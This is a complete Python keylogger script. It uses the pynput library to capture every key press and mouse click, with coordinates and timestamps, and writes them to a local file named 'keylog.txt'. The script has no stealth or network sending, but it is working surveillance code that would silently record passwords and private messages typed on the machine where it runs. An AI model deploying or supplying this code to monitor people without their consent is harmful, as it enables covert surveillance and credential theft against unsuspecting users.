from pynput import keyboard
from pynput import mouse
import logging

def setup_logger(log_file):
    # Create a logger
    logger = logging.getLogger('keylogger')
    logger.setLevel(logging.DEBUG)

    # Create a file handler to write logs to a file
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)

    # Create a formatter and set it for the handler
    formatter = logging.Formatter('%(asctime)s - %(message)s')
    file_handler.setFormatter(formatter)

    # Add the handler to the logger
    logger.addHandler(file_handler)

    return logger

logger = setup_logger('keylog.txt')

def on_press(key):
    try:
        # Log the key press
        logger.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        if key != keyboard.Key.cmd:
            key_name = str(key).replace("Key.", "")
            logger.info(f"Special key pressed: {key_name}")
        elif key == keyboard.Key.cmd:
            logger.info('Key pressed: Windows')
    except Exception as e:
        logger.error(f'Error logging key press: {e}')

def on_click(x, y, button, pressed):
    try:
        mouse_name = str(button).replace("Button.", "")
        logger.info(f'Mouse clicked at ({x}, {y}) with {mouse_name}')
    except Exception as e:
        logger.error(f'Error logging mouse click: {e}')

    
# Set up listeners for both keyboard and mouse events
with keyboard.Listener(on_press=on_press) as listener:
    with mouse.Listener(on_click=on_click) as mouse_listener:
        listener.join()
        mouse_listener.join()